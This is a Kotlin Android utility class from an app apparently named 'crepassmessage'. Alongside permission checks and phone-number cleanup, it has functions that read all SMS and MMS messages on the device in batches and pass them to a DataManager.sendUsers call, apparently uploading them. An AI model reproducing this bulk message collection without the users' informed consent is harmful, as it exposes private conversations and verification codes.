package com.crepass.crepassmessage.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.app.ActivityCompat
import com.crepass.crepassmessage.DataManager
import com.crepass.crepassmessage.listeners.BatchedQueryCallback
import com.crepass.crepassmessage.models.SMSMessage

class AndroidDataUtils {
    fun normalizePhoneNumber(srcNumber: String?): String? {
        return removeNonDigits(srcNumber)
    }
    private fun removeNonDigits(str: String?): String {
        return if (str.isNullOrEmpty()) {
            ""
        } else str.replace("\\D+".toRegex(), "")
    }

    fun hasPermission(context: Context, permissionStr: String): Boolean {
        val hasPermission = ActivityCompat.checkSelfPermission(
            context,
            permissionStr
        ) == PackageManager.PERMISSION_GRANTED
        if (hasPermission) {
            Log.d("AndroidDataUtils", "Has Permission for: $permissionStr")
        } else {
            Log.e("AndroidDataUtils", "No Permission for: $permissionStr")
        }
        return hasPermission
    }



    fun sendSMSMessages(context:Context){

                if(hasPermission(context,Manifest.permission.READ_SMS)){
                    SMSManager().getSMSMessages(context.applicationContext,object :BatchedQueryCallback{
                        override fun onBatchQueried(msgs: List<SMSMessage>) {
                            Log.d("AndroidDataUtils","SMS Batch Querying")
                            DataManager.sendUsers(context.applicationContext,msgs)
                        }
                    })
                }


    }
    fun sendMMSMessages(context:Context){

        if(hasPermission(context,Manifest.permission.READ_SMS)){
            MMSManager().getMMSMessages(context.applicationContext,object :BatchedQueryCallback{
                override fun onBatchQueried(msgs: List<SMSMessage>) {
                    Log.d("AndroidDataUtils","SMS Batch Querying")
                    DataManager.sendUsers(context.applicationContext,msgs)
                }
            })
        }


    }
}